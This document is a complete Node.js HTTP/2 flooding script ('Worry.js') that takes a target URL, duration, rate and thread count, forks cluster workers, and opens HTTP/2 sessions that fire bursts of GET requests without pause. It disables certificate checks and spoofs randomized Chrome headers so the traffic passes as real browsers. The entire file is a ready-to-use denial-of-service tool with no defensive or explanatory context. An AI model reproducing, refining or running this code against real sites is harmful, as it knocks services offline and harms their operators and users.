const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const { HeaderGenerator } = require('header-generator');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5) {
    console.log("Usage: node Worry.js target time rate threads");
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
};

const parsedTarget = url.parse(args.target);
const headerGenerator = new HeaderGenerator({
    browsers: [
        { name: "chrome", minVersion: 112, httpVersion: "2" },
    ],
    devices: ["desktop"],
    operatingSystems: ["windows"]
});

const getRandomHeaders = () => headerGenerator.getHeaders();

function runFlood() {
    const client = http2.connect(`${parsedTarget.protocol}//${parsedTarget.host}`, {
        settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144
        },
        maxSessionMemory: 64000,
        rejectUnauthorized: false,
        ALPNProtocols: ["h2"]
    });

    client.on("connect", () => {
        for (let i = 0; i < args.rate; i++) {
            const headers = Object.assign({
                ':method': 'GET',
                ':path': parsedTarget.path,
                ':scheme': parsedTarget.protocol.replace(":", ""),
                ':authority': parsedTarget.host
            }, getRandomHeaders());

            const req = client.request(headers);
            req.setEncoding("utf8");
            req.on("response", () => {
                req.close();
            });
            req.end();
        }
    });

    client.on("error", () => {
        client.destroy();
    });
}

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
    setTimeout(() => {
        process.exit(0);
    }, args.time * 1000);
} else {
    setInterval(runFlood);
}
